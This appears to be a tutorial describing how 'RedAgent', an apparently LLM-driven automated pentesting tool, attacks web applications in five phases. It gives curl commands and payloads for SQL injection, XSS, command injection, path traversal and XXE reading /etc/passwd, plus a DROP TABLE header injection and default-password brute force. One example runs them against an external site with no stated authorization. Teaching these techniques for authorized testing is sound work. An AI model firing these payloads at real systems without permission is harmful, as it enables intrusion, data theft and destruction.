# How RedAgent Attacks Web Applications - Complete Flow

## Executive Summary

RedAgent uses a 5-phase autonomous attack methodology:

1. **Reconnaissance** → Discover what's running
2. **Analysis** → Find vulnerabilities  
3. **Planning** → Decide attack strategy
4. **Execution** → Actually attack it
5. **Reporting** → Document findings

---

## PHASE 1: RECONNAISSANCE - Discover Services

### What RedAgent Does:
Uses **Nmap** (Network Mapper) to scan the target

### Real Command:
```bash
nmap -p 1-1000 -sV localhost:8080
```

### What This Reveals:
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    httpbin/0.9.2
```

### What RedAgent Learns:
- Service is running on port 8080
- It's httpbin version 0.9.2
- It's a web service (HTTP)

### Attack Implication:
- Now we know WHERE to attack (localhost:8080)
- We know WHAT it is (httpbin - a testing service)
- We can look up known vulnerabilities for httpbin 0.9.2

---

## PHASE 2: VULNERABILITY ANALYSIS - Find Weaknesses

### What RedAgent Does:
Uses **CURL** to fetch HTTP headers and look for security gaps

### Real Command:
```bash
curl -v http://localhost:8080
```

### What This Shows:
```
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
X-Frame-Options: [MISSING!]
Content-Security-Policy: [MISSING!]
```

### What RedAgent Learns:
- Server: gunicorn 20.0.4 (Python web framework)
- Missing X-Frame-Options header (Clickjacking vulnerability)
- Missing Content-Security-Policy header (XSS vulnerability)

### Attack Implication:
- We can try XSS attacks (no CSP protection)
- We can try Clickjacking (no X-Frame-Options)
- Gunicorn 20.0.4 may have known CVEs

---

## PHASE 3: EXPLOITATION PLANNING - Strategy

### What RedAgent Does:
**LLM (AI) analyzes findings** and creates an attack plan

### AI Reasoning:
```
Analysis of findings:
- Service: httpbin (known to accept various inputs)
- Missing security headers detected
- Potential vectors: SQL injection, XSS, command injection

Attack priorities:
1. Try XSS (highest probability - no CSP)
2. Try SQL injection (if database exists)
3. Try command injection (if user input goes to shell)
```

### RedAgent Decision:
"Let's try XSS first (high success chance), then SQL injection, then command injection"

---

## PHASE 4: ATTACK EXECUTION - Actually Attack It

### ATTACK #1: SQL INJECTION

**Goal:** Test if we can manipulate database queries

**Payload Design:**
```sql
' OR '1'='1
```

**How It Works:**
- Normal query: `SELECT * FROM users WHERE id = 1`
- With payload: `SELECT * FROM users WHERE id = '' OR '1'='1'`
- Result: Always true, returns ALL users!

**RedAgent Command:**
```bash
curl "http://localhost:8080/api/users?id=1' OR '1'='1"
```

**Analysis:**
- ✓ If returns user data → VULNERABLE
- ✗ If error message → Database detected
- ✗ If unchanged → PROTECTED

---

### ATTACK #2: CROSS-SITE SCRIPTING (XSS)

**Goal:** Test if we can inject JavaScript

**Payload Design:**
```html
<script>alert('XSS')</script>
```

**How It Works:**
- Normal input: `search?q=hello`
- With payload: `search?q=<script>alert('XSS')</script>`
- If not filtered, JavaScript runs in victim's browser!

**RedAgent Command:**
```bash
curl "http://localhost:8080/search?q=<script>alert('XSS')</script>"
```

**Analysis:**
- ✓ If `<script>` appears in response → VULNERABLE (no escaping)
- ✗ If `&lt;script&gt;` appears → PROTECTED (HTML encoded)

---

### ATTACK #3: COMMAND INJECTION

**Goal:** Test if we can execute OS commands

**Payload Design:**
```bash
test;whoami
```

**How It Works:**
- Normal command: `ping localhost`
- With payload: `ping localhost;whoami`
- Semicolon separates commands! Now we run whoami!

**RedAgent Command:**
```bash
curl "http://localhost:8080/ping?host=localhost;whoami"
```

**Analysis:**
- ✓ If response shows user ID (uid=0, root) → VULNERABLE (command executed!)
- ✗ If unchanged ping output → PROTECTED

---

### ATTACK #4: PATH TRAVERSAL

**Goal:** Test if we can read files outside allowed directory

**Payload Design:**
```
../../../../etc/passwd
```

**How It Works:**
- Normal path: `/uploads/myfile.txt`
- With payload: `/uploads/../../../../etc/passwd`
- The `../` climbs directory tree → escape the sandbox!

**RedAgent Command:**
```bash
curl "http://localhost:8080/files/../../../../etc/passwd"
```

**Analysis:**
- ✓ If returns `/etc/passwd` content (root:*:0:0...) → VULNERABLE (file read!)
- ✗ If 404 error → PROTECTED

---

### ATTACK #5: HTTP HEADER INJECTION

**Goal:** Test if we can inject malicious headers

**Payload Design:**
```
X-Forwarded-For: 127.0.0.1; DROP TABLE users
```

**How It Works:**
- Normal header: `X-Forwarded-For: 192.168.1.1`
- With injection: `X-Forwarded-For: 127.0.0.1; DROP TABLE users`
- If not sanitized, SQL command executes!

**RedAgent Command:**
```bash
curl -H "X-Forwarded-For: 127.0.0.1; DROP TABLE users" http://localhost:8080
```

**Analysis:**
- ✓ If database drops or error occurs → VULNERABLE (injection worked!)
- ✗ If header ignored → PROTECTED

---

### ATTACK #6: LDAP INJECTION

**Goal:** Test if we can modify LDAP query logic

**Payload Design:**
```
*)(uid=*
```

**How It Works:**
- Normal LDAP filter: `(uid=admin)`
- With payload: `(uid=*)(uid=*`
- Logic is broken! Now returns multiple entries!

**RedAgent Command:**
```bash
curl "http://localhost:8080/login?user=*)(uid=*&pass=test"
```

**Analysis:**
- ✓ If authentication bypassed → VULNERABLE
- ✗ If LDAP errors visible → DETECTED (LDAP service exists!)

---

### ATTACK #7: XXE (XML EXTERNAL ENTITY)

**Goal:** Test if we can read files via XML parser

**Payload Design:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**How It Works:**
- Normal XML: `<data>value</data>`
- With XXE: References external file! Parser reads `/etc/passwd`!

**RedAgent Command:**
```bash
curl -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \
  http://localhost:8080/api/xml
```

**Analysis:**
- ✓ If file contents returned → VULNERABLE (file read!)
- ✗ If XML parsing disabled → PROTECTED

---

### ATTACK #8: BRUTE FORCE WEAK CREDENTIALS

**Goal:** Test if we can guess default/weak passwords

**Passwords to Try:**
```
admin:admin
admin:password
admin:123456
root:root
test:test
```

**How It Works:**
- Try common username/password combos
- HTTP response codes tell us success/failure
- 200 = Success
- 401 = Wrong password
- 403 = No access

**RedAgent Command:**
```bash
curl -u admin:admin http://localhost:8080/admin
curl -u admin:password http://localhost:8080/admin
curl -u root:root http://localhost:8080/admin
```

**Analysis:**
- ✓ If HTTP 200 + user data → CREDENTIALS FOUND!
- ✗ If HTTP 401 → Protected (but password guessing works)

---

## PHASE 5: REPORTING - Document Findings

### What RedAgent Does:
**Generates JSON report** with all results

### Example Report:
```json
{
  "target": "http://localhost:8080",
  "attacks": [
    {
      "attack": "SQL Injection (SQLmap)",
      "status": "NO SQL INJECTION FOUND",
      "result": "No vulnerable parameters detected"
    },
    {
      "attack": "Command Injection (test;whoami)",
      "status": "VULNERABLE - Command Injection",
      "result": "Command executed on system!"
    },
    {
      "attack": "HTTP Basic Auth Brute Force",
      "status": "SUCCESS - Credentials found: admin:admin",
      "result": "Access granted with admin:admin"
    }
  ],
  "risk_level": "HIGH"
}
```

---

## HOW TO MANUALLY TEST YOURSELF

### Simple Example: Test for XSS

```bash
# 1. Choose a web app with a search box
# Example: http://localhost:8080/search

# 2. Craft XSS payload
PAYLOAD='<script>alert(1)</script>'

# 3. Send attack via curl
curl "http://localhost:8080/search?q=$PAYLOAD"

# 4. Check response
# If you see: <h1>Results for: <script>alert(1)</script></h1>
#    → VULNERABLE! (JavaScript would execute in browser)
#
# If you see: <h1>Results for: &lt;script&gt;alert(1)&lt;/script&gt;</h1>
#    → SAFE! (HTML encoded, script won't run)
```

### Another Example: Command Injection

```bash
# 1. Find a parameter that takes input
# Example: http://localhost:8080/ping?host=

# 2. Craft command injection payload
PAYLOAD='localhost;whoami'

# 3. Send attack
curl "http://localhost:8080/ping?host=$PAYLOAD"

# 4. Check response
# If you see "root" or "uid=0" in response
#    → VULNERABLE! (Command executed!)
#
# If you see normal ping output (unchanged)
#    → PROTECTED! (Commands blocked)
```

---

## KEY CONCEPTS

### What is a Payload?
A "payload" is the attack code/data you send:
- SQL injection payload: `' OR '1'='1`
- XSS payload: `<script>alert(1)</script>`
- Command payload: `; whoami`

### How Attacks Work
1. **Identify input point** (URL parameter, form field, header)
2. **Craft payload** (malicious code for that input type)
3. **Send via HTTP** (GET/POST/Header)
4. **Analyze response** (Check if attack worked)

### Success Indicators
- Unexpected data in response (file contents, user info)
- Error messages revealing system info
- Changes to application behavior
- HTTP status code changes (200 → 500 = crash)

### Protection Methods
- **SQL Injection**: Use parameterized queries
- **XSS**: HTML-encode all user input
- **Path Traversal**: Validate file paths
- **Command Injection**: Never use shell=True with user input
- **XXE**: Disable external entity processing
- **Weak Auth**: Use strong passwords and MFA

---

## Real-World Example

### Scenario: You find a vulnerable web app

```bash
# Step 1: Discover (Nmap)
nmap -sV targetsite.com
# Output: Port 80 open - Apache 2.4.41

# Step 2: Analyze (CURL)
curl -v targetsite.com
# Output: Missing CSP header, shows PHP version in headers

# Step 3: Plan (Human decision)
# "Apache 2.4.41 + PHP = likely to have known vulns"

# Step 4: Attack (CURL)
curl "http://targetsite.com/search?q=<img src=x onerror=alert(1)>"
# Output: Shows our XSS payload in response → VULNERABLE!

# Step 5: Report
# "XSS vulnerability found in search functionality
#  Severity: HIGH
#  Recommendation: Implement output encoding"
```

---

## Summary

**RedAgent automates this entire 5-phase process:**

1. ✅ **Reconnaissance**: Automatically scan services
2. ✅ **Analysis**: Automatically check for misconfigurations
3. ✅ **Planning**: LLM decides best attacks
4. ✅ **Execution**: Automatically tests all 8 attack vectors
5. ✅ **Reporting**: Creates detailed JSON report

**You can do the same manually using:**
- `curl` for HTTP requests
- `sqlmap` for SQL injection
- `hydra` for brute force
- Custom payloads for XXE, XSS, etc.

The key is understanding the vulnerability, crafting the right payload, and analyzing the response!
